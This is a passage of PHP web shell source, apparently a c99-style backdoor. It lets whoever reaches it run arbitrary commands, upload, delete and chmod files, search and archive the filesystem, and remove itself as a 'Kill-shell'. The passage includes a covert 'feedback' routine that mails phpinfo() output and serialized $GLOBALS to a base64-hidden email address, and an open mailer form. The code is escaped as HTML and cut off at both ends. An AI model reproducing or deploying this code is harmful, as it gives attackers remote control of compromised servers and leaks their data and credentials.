for($i=0;$i&lt;$c;$i++) {
  $hex = dechex(ord($encoder_input[$i]));
  if ($encoder_input[$i] == "&") {echo $encoder_input[$i];}
  elseif ($encoder_input[$i] != "\\") {echo "%".$hex;}
}
echo "\" readonly&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/center&gt;&lt;/form&gt;";
}
if ($act == "fsbuff") {
  $arr_copy = $sess_data["copy"];
  $arr_cut = $sess_data["cut"];
  $arr = array_merge($arr_copy,$arr_cut);
  if (count($arr) == 0) {echo "&lt;h2&gt;&lt;center&gt;Buffer is empty!&lt;/center&gt;&lt;/h2&gt;";}
  else {
    $fx_infohead = "File-System Buffer";
    $ls_arr = $arr;
    $disp_fullpath = TRUE;
    $act = "ls";
  }
}
if ($act == "selfremove") {
  if (($submit == $rndcode) and ($submit != "")) {
    if (unlink(__FILE__)) { @ob_clean(); echo "Thanks for using ".$sh_name."!"; exshexit(); }
    else { echo "&lt;center&gt;&lt;b&gt;Can't delete ".__FILE__."!&lt;/b&gt;&lt;/center&gt;"; }
  }
  else {
    if (!empty($rndcode)) {echo "&lt;b&gt;Error: incorrect confirmation!&lt;/b&gt;";}
    $rnd = rand(0,9).rand(0,9).rand(0,9);
    echo "&lt;form action=\"".$surl."\"&gt;\n".
         "&lt;input type=hidden name=act value=selfremove&gt;".
         "&lt;input type=hidden name=rndcode value=\"".$rnd."\"&gt;".
         "&lt;b&gt;Kill-shell: ".__FILE__." &lt;br&gt;".
         "&lt;b&gt;Are you sure? For confirmation, enter \"".$rnd."\"&lt;/b&gt;:&nbsp;&lt;input type=text name=submit&gt;&nbsp;&lt;input type=submit value=\"YES\"&gt;\n".
         "&lt;/form&gt;\n";
  }
}
if ($act == "update") {
  $ret = exsh_getupdate(!!$confirmupdate);
  echo "&lt;b&gt;".$ret."&lt;/b&gt;";
  if (stristr($ret,"new version")) {
    echo "&lt;br&gt;&lt;br&gt;&lt;input type=button onclick=\"location.href='".$surl."act=update&confirmupdate=1';\" value=\"Update now\"&gt;";
  }
}
if ($act == "feedback") {
  $suppmail = base64_decode("c2ltdWthczIxQGhvdG1haWwuY29t");
  if (!empty($submit)){
    $ticket = substr(md5(microtime()+rand(1,1000)),0,6);
    $body = $sh_name." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\n\nIP: ".$REMOTE_ADDR;
    if (!empty($fdbk_ref)) {
      $tmp = @ob_get_contents();
      ob_clean();
      phpinfo();
      $phpinfo = base64_encode(ob_get_contents());
      ob_clean();
      echo $tmp;
      $body .= "\n"."phpinfo(): ".$phpinfo."\n"."\$GLOBALS=".base64_encode(serialize($GLOBALS))."\n";
    }
    mail($suppmail,$sh_name." feedback #".$ticket,$body,"FROM: ".$suppmail);
    echo "&lt;center&gt;&lt;b&gt;Thanks for your feedback! Your ticket ID: ".$ticket.".&lt;/b&gt;&lt;/center&gt;";
  }
  else {
    echo "&lt;form action=\"".$surl."\" method=POST&gt;".
         "&lt;input type=hidden name=act value=feedback&gt;".
         "&lt;table class=contents&gt;&lt;tr&gt;&lt;td class=barheader colspan=2&gt;".
         ".: Feedback or report bug (".str_replace(array("@","."),array("[at]","[dot]"),$suppmail).") :.&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;Your name:&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"fdbk_name\" value=\"".htmlspecialchars($fdbk_name)."\"&gt;&lt;/td&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;Your e-mail:&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"fdbk_email\" value=\"".htmlspecialchars($fdbk_email)."\"&gt;&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;Message:&lt;/td&gt;&lt;td&gt;&lt;textarea name=\"fdbk_body\" cols=80 rows=10&gt;".htmlspecialchars($fdbk_body)."&lt;/textarea&gt;&lt;input type=\"hidden\" name=\"fdbk_ref\" value=\"".urlencode($HTTP_REFERER)."\"&gt;&lt;br&gt;".
         "&lt;input type=\"checkbox\" name=\"fdbk_servinf\" value=\"1\" checked&gt; Attach Server info (Recommended for bug-fix)&lt;br&gt;".
         "*Language: English, Indonesian.&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Send\"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;".
         "&lt;/table&gt;\n";
  }
}
if ($act == "fxmailer") {
  if (!empty($submit)){
    $headers = 'To: '.$dest_email."\r\n";
    $headers .= 'From: '.$sender_name.' '.$sender_email."\r\n";
    if (mail($suppmail,$sender_subj,$sender_body,$header)) {
      echo "&lt;center&gt;&lt;b&gt;Email sent!&lt;/b&gt;&lt;/center&gt;";
    }
    else { echo "&lt;center&gt;&lt;b&gt;Can't send email!&lt;/b&gt;&lt;/center&gt;"; }
  }
  else {
    echo "&lt;form action=\"".$surl."\" method=POST&gt;".
         "&lt;input type=hidden name=act value=fxmailer&gt;".
         "&lt;table class=contents&gt;&lt;tr&gt;&lt;td class=barheader colspan=2&gt;".
         ".: $sh_name Mailer :.&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;Your name:&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"sender_name\" value=\"".htmlspecialchars($sender_name)."\"&gt;&lt;/td&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;Your e-mail:&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"sender_email\" value=\"".htmlspecialchars($sender_email)."\"&gt;&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;To:&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"dest_email\" value=\"".htmlspecialchars($dest_email)."\"&gt;&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;Subject:&lt;/td&gt;&lt;td&gt;&lt;input size=70 type=\"text\" name=\"sender_subj\" value=\"".htmlspecialchars($sender_subj)."\"&gt;&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;Message:&lt;/td&gt;&lt;td&gt;&lt;textarea name=\"sender_body\" cols=80 rows=10&gt;".htmlspecialchars($sender_body)."&lt;/textarea&gt;&lt;br&gt;".
         "&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Send\"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;".
         "&lt;/table&gt;\n";
  }
}
if ($act == "search") {
  echo "&lt;div class=barheader&gt;.: $sh_name File-System Search :.&lt;/div&gt;";
  if (empty($search_in)) {$search_in = $d;}
  if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}
  if (empty($search_text_wwo)) {$search_text_regexp = 0;}
  if (!empty($submit)) {
    $found = array();
    $found_d = 0;
    $found_f = 0;
    $search_i_f = 0;
    $search_i_d = 0;
    $a = array(
        "name"=&gt;$search_name,
        "name_regexp"=&gt;$search_name_regexp,
        "text"=&gt;$search_text,
        "text_regexp"=&gt;$search_text_regxp,
        "text_wwo"=&gt;$search_text_wwo,
        "text_cs"=&gt;$search_text_cs,
        "text_not"=&gt;$search_text_not
    );
    $searchtime = getmicrotime();
    $in = array_unique(explode(";",$search_in));
    foreach($in as $v) {exfsearch($v);}
    $searchtime = round(getmicrotime()-$searchtime,4);
    if (count($found) == 0) {echo "No files found!";}
    else {
      $ls_arr = $found;
      $disp_fullpath = TRUE;
      $act = "ls";
    }
  }
  echo "&lt;table class=contents&gt;".
       "&lt;tr&gt;&lt;td&gt;&lt;form method=POST&gt;".
       "&lt;input type=hidden name=\"d\" value=\"".$dispd."\"&gt;&lt;input type=hidden name=act value=\"".$dspact."\"&gt;".
       "File or folder Name:&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"search_name\" size=\"".round(strlen($search_name)+25)."\" value=\"".htmlspecialchars($search_name)."\"&gt;&nbsp;&lt;input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\" ".($search_name_regexp == 1?" checked":"")."&gt; - Regular Expression&lt;/td&gt;&lt;/tr&gt;".
       "&lt;tr&gt;&lt;td&gt;Look in (Separate by \";\"):&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"search_in\" size=\"".round(strlen($search_in)+25)."\" value=\"".htmlspecialchars($search_in)."\"&gt;&lt;/td&gt;&lt;/tr&gt;".
       "&lt;tr&gt;&lt;td&gt;A word or phrase in the file:&lt;/td&gt;&lt;td&gt;&lt;textarea name=\"search_text\" cols=\"50\" rows=\"5\"&gt;".htmlspecialchars($search_text)."&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;".
       "&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"checkbox\" name=\"search_text_regexp\" value=\"1\" ".($search_text_regexp == 1?" checked":"")."&gt; Regular Expression".
       "  &lt;input type=\"checkbox\" name=\"search_text_wwo\" value=\"1\" ".($search_text_wwo == 1?" checked":"")."&gt; Whole words only".
       "  &lt;input type=\"checkbox\" name=\"search_text_cs\" value=\"1\" ".($search_text_cs == 1?" checked":"")."&gt; Case sensitive".
       "  &lt;input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".($search_text_not == 1?" checked":"")."&gt; Find files NOT containing the text&lt;/td&gt;&lt;/tr&gt;".
       "&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit name=submit value=\"Search\"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;".
       "&lt;/table&gt;\n";
  if ($act == "ls") {
    $dspact = $act;
    echo $searchtime." secs (".$search_i_f." files and ".$search_i_d." folders, ".round(($search_i_f+$search_i_d)/$searchtime,4)." objects per second).&lt;/b&gt;".
         "&lt;hr size=\"1\" noshade&gt;";
  }
}
if ($act == "chmod") {
  $mode = fileperms($d.$f);
  if (!$mode) {echo "&lt;b&gt;Change file-mode with error:&lt;/b&gt; can't get current value.";}
  else {
    $form = TRUE;
    if ($chmod_submit) {
      $octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);
      if (chmod($d.$f,$octet)) { $act = "ls"; $form = FALSE; $err = ""; }
      else {$err = "Can't chmod to ".$octet.".";}
    }
    if ($form) {
      $perms = parse_perms($mode);
      echo "&lt;b&gt;Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")&lt;/b&gt;&lt;br&gt;".($err?"&lt;b&gt;Error:&lt;/b&gt; ".$err:"")."&lt;form action=\"".$surl."\" method=POST&gt;&lt;input type=hidden name=d value=\"".htmlspecialchars($d)."\"&gt;&lt;input type=hidden name=f value=\"".htmlspecialchars($f)."\"&gt;&lt;input type=hidden name=act value=chmod&gt;&lt;table align=left width=300 border=0 cellspacing=0 cellpadding=5&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"")."&gt;&nbsp;Read&lt;br&gt;&lt;input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"")."&gt;&nbsp;Write&lt;br&gt;&lt;input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"")."&gt;eXecute&lt;/td&gt;&lt;td&gt;&lt;b&gt;Group&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"")."&gt;&nbsp;Read&lt;br&gt;&lt;input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"")."&gt;&nbsp;Write&lt;br&gt;&lt;input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"")."&gt;eXecute&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;World&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"")."&gt;&nbsp;Read&lt;br&gt;&lt;input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"")."&gt;&nbsp;Write&lt;br&gt;&lt;input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"")."&gt;eXecute&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;input type=submit name=chmod_submit value=\"Save\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;";
    }
  }
}
if ($act == "upload") {
  $uploadmess = "";
  $uploadpath = str_replace("\\",DIRECTORY_SEPARATOR,$uploadpath);
  if (empty($uploadpath)) {$uploadpath = $d;}
  elseif (substr($uploadpath,-1) != DIRECTORY_SEPARATOR) {$uploadpath .= DIRECTORY_SEPARATOR;}
  if (!empty($submit)) {
    global $_FILES;
    $uploadfile = $_FILES["uploadfile"];
    if (!empty($uploadfile["tmp_name"])) {
      if (empty($uploadfilename)) {$destin = $uploadfile["name"];}
      else {$destin = $userfilename;}
      if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {
        $uploadmess .= "Error uploading file ".$uploadfile["name"]." (can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!&lt;br&gt;";
      }
      else { $uploadmess .= "File uploaded successfully!&lt;br&gt;".$uploadpath.$destin; }
    }
    else { echo "No file to upload!"; }
  }
  if ($miniform) {
    echo "&lt;b&gt;".$uploadmess."&lt;/b&gt;";
    $act = "ls";
  }
  else {
    echo "&lt;table&gt;&lt;tr&gt;&lt;td colspan=2 class=barheader&gt;".
         ".: File Upload :.&lt;/td&gt;".
         "&lt;td colspan=2&gt;".$uploadmess."&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;&lt;form enctype=\"multipart/form-data\" action=\"".$surl."act=upload&d=".urlencode($d)."\" method=POST&gt;".
         "From Your Computer:&lt;/td&gt;&lt;td&gt;&lt;input name=\"uploadfile\" type=\"file\"&gt;&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;From URL:&lt;/td&gt;&lt;td&gt;&lt;input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"&gt;&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;Target Directory:&lt;/td&gt;&lt;td&gt;&lt;input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"&gt;&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;Target File Name:&lt;/td&gt;&lt;td&gt;&lt;input name=uploadfilename size=25&gt;&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=checkbox name=uploadautoname value=1 id=df4&gt; Convert file name to lowercase&lt;/td&gt;&lt;/tr&gt;".
         "&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit name=submit value=\"Upload\"&gt;".
         "&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
  }
}
if ($act == "delete") {
  $delerr = "";
  foreach ($actbox as $v) {
    $result = FALSE;
    $result = fs_rmobj($v);
    if (!$result) { $delerr .= "Can't delete ".htmlspecialchars($v)."&lt;br&gt;"; }
  }
  if (!empty($delerr)) { echo "&lt;b&gt;Error deleting:&lt;/b&gt;&lt;br&gt;".$delerr; }
  $act = "ls";
}
if (!$usefsbuff) {
  if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {
    echo "&lt;center&gt;&lt;b&gt;Sorry, buffer is disabled. For enable, set directive \"\$usefsbuff\" as TRUE.&lt;/center&gt;";
  }
}
else {
  if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); ex_sess_put($sess_data); $act = "ls"; }
  elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); ex_sess_put($sess_data); $act = "ls";}
  elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=&gt;$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=&gt;$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} ex_sess_put($sess_data); $act = "ls";}
  if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); ex_sess_put($sess_data);}
  elseif ($actpastebuff) {
    $psterr = "";
    foreach($sess_data["copy"] as $k=&gt;$v) {
      $to = $d.basename($v);
      if (!fs_copy_obj($v,$to)) {$psterr .= "Can't copy ".$v." to ".$to."!&lt;br&gt;";}
      if ($copy_unset) {unset($sess_data["copy"][$k]);}
    }
    foreach($sess_data["cut"] as $k=&gt;$v) {
      $to = $d.basename($v);
      if (!fs_move_obj($v,$to)) {$psterr .= "Can't move ".$v." to ".$to."!&lt;br&gt;";}
      unset($sess_data["cut"][$k]);
    }
    ex_sess_put($sess_data);
    if (!empty($psterr)) {echo "&lt;b&gt;Pasting with errors:&lt;/b&gt;&lt;br&gt;".$psterr;}
    $act = "ls";
  }
  elseif ($actarcbuff) {
    $arcerr = "";
    if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}
    else {$ext = ".tar.gz";}
    if ($ext == ".tar.gz") {$cmdline = "tar cfzv";}
    $cmdline .= " ".$actarcbuff_path;
    $objects = array_merge($sess_data["copy"],$sess_data["cut"]);
    foreach($objects as $v) {
      $v = str_replace("\\",DIRECTORY_SEPARATOR,$v);
      if (substr($v,0,strlen($d)) == $d) {$v = basename($v);}
      if (is_dir($v)) {
        if (substr($v,-1) != DIRECTORY_SEPARATOR) {$v .= DIRECTORY_SEPARATOR;}
        $v .= "*";
      }
      $cmdline .= " ".$v;
    }
    $tmp = realpath(".");
    chdir($d);
    $ret = exexec($cmdline);
    chdir($tmp);
    if (empty($ret)) {$arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!&lt;br&gt;";}
    $ret = str_replace("\r\n","\n",$ret);
    $ret = explode("\n",$ret);
    if ($copy_unset) {foreach($sess_data["copy"] as $k=&gt;$v) {unset($sess_data["copy"][$k]);}}
    foreach($sess_data["cut"] as $k=&gt;$v) {
      if (in_array($v,$ret)) {fs_rmobj($v);}
      unset($sess_data["cut"][$k]);
    }
    ex_sess_put($sess_data);
    if (!empty($arcerr)) {echo "&lt;b&gt;Archivation errors:&lt;/b&gt;&lt;br&gt;".$arcerr;}
    $act = "ls";
  }
  elseif ($actpastebuff) {
    $psterr = "";
    foreach($sess_data["copy"] as $k=&gt;$v) {
      $to = $d.basename($v);
      if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!&lt;br&gt;";}
      if ($copy_unset) {unset($sess_data["copy"][$k]);}
    }
    foreach($sess_data["cut"] as $k=&gt;$v) {
      $to = $d.basename($v);
      if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!&lt;br&gt;";}
      unset($sess_data["cut"][$k]);
    }
    ex_sess_put($sess_data);
    if (!empty($psterr)) {echo "&lt;b&gt;Error pasting:&lt;/b&gt;&lt;br&gt;".$psterr;}
    $act = "ls";
  }
}
if ($act == "cmd") {
  @chdir($chdir);
  if (!empty($submit)) {
    echo "&lt;div class=barheader&gt;.: Results of Execution :.&lt;/div&gt;\n";
    $olddir = realpath(".");
    @chdir($d);
    $ret = exexec($cmd);
    $ret = convert_cyr_string($ret,"d","w");
    if ($cmd_txt) {
      $rows = count(explode("\n",$ret))+1;
      if ($rows &lt; 10) { $rows = 10; } else { $rows = 30; }
      $cols = 130;
      echo "&lt;textarea class=shell cols=\"$cols\" rows=\"$rows\" readonly&gt;".htmlspecialchars($ret)."&lt;/textarea&gt;\n";
      //echo "&lt;div align=left&gt;&lt;pre&gt;".htmlspecialchars($ret)."&lt;/pre&gt;&lt;/div&gt;";
    }
    else { echo $ret."&lt;br&gt;"; }
    @chdir($olddir);
  }
}
if ($act == "ls") {
  if (count($ls_arr) &gt; 0) { $list = $ls_arr; }
  else {
    $list = array();
    if ($h = @opendir($d)) {
      while (($o = readdir($h)) !== FALSE) {$list[] = $d.$o;}
      closedir($h);
    }
  }
  if (count($list) == 0) { echo "&lt;div class=fxerrmsg&gt;Can't open folder (".htmlspecialchars($d).")!&lt;/div&gt;";}
  else {
    $objects = array();
    $vd = "f"; //Viewing mode
    if ($vd == "f") {
      $objects["head"] = array();
      $objects["folders"] = array();
      $objects["links"] = array();
      $objects["files"] = array();
      foreach ($list as $v) {
        $o = basename($v);
        $row = array();
        if ($o == ".") {$row[] = $d.$o; $row[] = "CURDIR";}
        elseif ($o == "..") {$row[] = $d.$o; $row[] = "UPDIR";}
        elseif (is_dir($v)) {
          if (is_link($v)) {$type = "LINK";}
          else {$type = "DIR";}
          $row[] = $v;
          $row[] = $type;
        }
        elseif(is_file($v)) {$row[] = $v; $row[] = filesize($v);}
        $row[] = filemtime($v);
        if (!$win) {
          $ow = posix_getpwuid(fileowner($v));
          $gr = posix_getgrgid(filegroup($v));
          $row[] = ($ow["name"]?$ow["name"]:fileowner($v))."/".($gr["name"]?$gr["name"]:filegroup($v));
        }
        $row[] = fileperms($v);
        if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;}
        elseif (is_link($v)) {$objects["links"][] = $row;}
        elseif (is_dir($v)) {$objects["folders"][] = $row;}
        elseif (is_file($v)) {$objects["files"][] = $row;}
        $i++;
      }
      $row = array();
      $row[] = "&lt;b&gt;Name&lt;/b&gt;";
      $row[] = "&lt;b&gt;Size&lt;/b&gt;";
      $row[] = "&lt;b&gt;Date Modified&lt;/b&gt;";
      if (!$win) {$row[] = "&lt;b&gt;Owner/Group&lt;/b&gt;";}
      $row[] = "&lt;b&gt;Perms&lt;/b&gt;";
      $row[] = "&lt;b&gt;Action&lt;/b&gt;";
      $parsesort = parsesort($sort);
      $sort = $parsesort[0].$parsesort[1];
      $k = $parsesort[0];
      if ($parsesort[1] != "a") {$parsesort[1] = "d";}
      $y = " &lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k.($parsesort[1] == "a"?"d":"a")."\"&gt;";
      $y .= "&lt;img src=\"".$surl."act=img&img=sort_".($sort[1] == "a"?"asc":"desc")."\" height=\"9\" width=\"14\" alt=\"".($parsesort[1] == "a"?"Asc.":"Desc")."\" border=\"0\"&gt;&lt;/a&gt;";
      $row[$k] .= $y;
      for($i=0;$i&lt;count($row)-1;$i++) {
        if ($i != $k) {$row[$i] = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$parsesort[1]."\"&gt;".$row[$i]."&lt;/a&gt;";}
      }
      $v = $parsesort[0];
      usort($objects["folders"], "tabsort");
      usort($objects["links"], "tabsort");
      usort($objects["files"], "tabsort");
      if ($parsesort[1] == "d") {
        $objects["folders"] = array_reverse($objects["folders"]);
        $objects["files"] = array_reverse($objects["files"]);
      }
      $objects = array_merge($objects["head"],$objects["folders"],$objects["links"],$objects["files"]);
      $tab = array();
      $tab["cols"] = array($row);
      $tab["head"] = array();
      $tab["folders"] = array();
      $tab["links"] = array();
      $tab["files"] = array();
      $i = 0;
      foreach ($objects as $a) {
        $v = $a[0];
        $o = basename($v);
        $dir = dirname($v);
        if ($disp_fullpath) {$disppath = $v;}
        else {$disppath = $o;}
        $disppath = str2mini($disppath,60);
        if (in_array($v,$sess_data["cut"])) {$disppath = "&lt;strike&gt;".$disppath."&lt;/strike&gt;";}
        elseif (in_array($v,$sess_data["copy"])) {$disppath = "&lt;u&gt;".$disppath."&lt;/u&gt;";}
        foreach ($regxp_highlight as $r) {
          if (ereg($r[0],$o)) {
            if ((!is_numeric($r[1])) or ($r[1] &gt; 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; exshexit();}
            else {
              $r[1] = round($r[1]);
              $isdir = is_dir($v);
              if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir)) {
                if (empty($r[2])) {$r[2] = "&lt;b&gt;"; $r[3] = "&lt;/b&gt;";}
                $disppath = $r[2].$disppath.$r[3];
                if ($r[4]) {break;}
              }
            }
          }
        }
        $uo = urlencode($o);
        $ud = urlencode($dir);
        $uv = urlencode($v);
        $row = array();
        if ($o == ".") {
          $row[] = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"&gt;&lt;img src=\"".$surl."act=img&img=small_dir\" border=\"0\"&gt;&nbsp;".$o."&lt;/a&gt;";
          $row[] = "CURDIR";
        }
        elseif ($o == "..") {
          $row[] = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"&gt;&lt;img src=\"".$surl."act=img&img=ext_lnk\" border=\"0\"&gt;&nbsp;".$o."&lt;/a&gt;";
          $row[] = "UPDIR";
        }
        elseif (is_dir($v)) {
          if (is_link($v)) {
            $disppath .= " =&gt; ".readlink($v);
            $type = "LINK";
            $row[] = "&lt;a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\"&gt;&lt;img src=\"".$surl."act=img&img=ext_lnk\" border=\"0\"&gt;&nbsp;[".$disppath."]&lt;/a&gt;";
          }
          else {
            $type = "DIR";
            $row[] =  "&lt;a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\"&gt;&lt;img src=\"".$surl."act=img&img=small_dir\" border=\"0\"&gt;&nbsp;[".$disppath."]&lt;/a&gt;";
          }
          $row[] = $type;
        }
        elseif(is_file($v)) {
          $ext = explode(".",$o);
          $c = count($ext)-1;
          $ext = $ext[$c];
          $ext = strtolower($ext);
          $row[] =  "&lt;a href=\"".$surl."act=f&f=".$uo."&d=".$ud."\"&gt;&lt;img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\"&gt;&nbsp;".$disppath."&lt;/a&gt;";
          $row[] = view_size($a[1]);
        }
        $row[] = @date("d.m.Y H:i:s",$a[2]);
        if (!$win) { $row[] = $a[3]; }
        $row[] = "&lt;a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"&gt;&lt;b&gt;".view_perms_color($v)."&lt;/b&gt;&lt;/a&gt;";
        if ($o == ".") {$checkbox = "&lt;input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\"&gt;"; $i--;}
        else {$checkbox = "&lt;input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\"&gt;";}
        if (is_dir($v)) {$row[] = "&lt;a href=\"".$surl."act=d&d=".$uv."\"&gt;&lt;img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" border=\"0\"&gt;&lt;/a&gt;&nbsp;".$checkbox;}
        else {$row[] = "&lt;a href=\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\"&gt;&lt;img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&lt;a href=\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\"&gt;&lt;img src=\"".$surl."act=img&img=change\" alt=\"Edit\" height=\"16\" width=\"19\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&lt;a href=\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\"&gt;&lt;img src=\"".$surl."act=img&img=download\" alt=\"Download\" border=\"0\"&gt;&lt;/a&gt;&nbsp;".$checkbox;}
        if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;}
        elseif (is_link($v)) {$tab["links"][] = $row;}
        elseif (is_dir($v)) {$tab["folders"][] = $row;}
        elseif (is_file($v)) {$tab["files"][] = $row;}
        $i++;
      }
    }
    // Compiling table
    $table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);
    echo "&lt;div class=barheader&gt;.: ";
    if (!empty($fx_infohead)) { echo $fx_infohead; }
    else { echo "Directory List (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders)"; }
    echo " :.&lt;/div&gt;\n";
    echo "&lt;form action=\"".$surl."\" method=POST name=\"ls_form\"&gt;&lt;input type=hidden name=act value=\"".$dspact."\"&gt;&lt;input type=hidden name=d value=".$d."&gt;".
         "&lt;table class=explorer&gt;";
    foreach($table as $row) {
      echo "&lt;tr&gt;";
      foreach($row as $v) {echo "&lt;td&gt;".$v."&lt;/td&gt;";}
      echo "&lt;/tr&gt;\r\n";
    }
    echo "&lt;/table&gt;".
         "&lt;script&gt;".
         "function ls_setcheckboxall(status) {".
         " var id = 1; var num = ".(count($table)-2).";".
         " while (id &lt;= num) { document.getElementById('actbox'+id).checked = status; id++; }".
         "}".
         "function ls_reverse_all() {".
         " var id = 1; var num = ".(count($table)-2).";".
         " while (id &lt;= num) { document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked; id++; }".
         "}".
         "&lt;/script&gt;".
         "&lt;div align=\"right\"&gt;".
